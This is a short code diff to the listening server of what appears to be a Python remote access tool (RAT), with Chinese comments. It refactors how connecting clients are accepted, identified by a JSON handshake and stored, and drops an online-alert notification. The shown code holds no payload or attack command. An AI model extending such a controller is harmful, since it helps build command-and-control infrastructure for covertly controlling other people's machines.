@@ -3,7 +3,6 @@ import socket
 
 from entity.client import Client
 from entity.ratsocket import RATSocket
-from util.notifier import notify
 
 
 class Server:
@@ -17,25 +16,23 @@ class Server:
         self.connections = []
 
     # 等待连接
-    def serve(self):
+    def serve(self, handler):
         print('[+] Listening on port {}'.format(self.address[1]))
-        self.socket.serve(self.address, self.handler)
+        self.socket.serve(self.address, handler)
 
-    # 接受连接后的回调函数
-    def handler(self, conn, addr):
+    # 接受连接
+    def accept(self, conn, addr):
         # 设置5秒超时
         conn.settimeout(5)
         try:
             # 接收验证信息
-            _, info = Client(conn, None, None).recv_result()
-            info = json.loads(info)
+            info = json.loads(Client(conn, None, None).recv_result()[1])
             # 取消超时
             conn.settimeout(None)
             # 保存连接
             self.connections.append(Client(conn, addr, info))
             print('[+] Connection has been established: {}'.format(addr))
-            # 上线提醒
-            notify(info)
+            return info
         except:
             # 关闭连接
             conn.close()
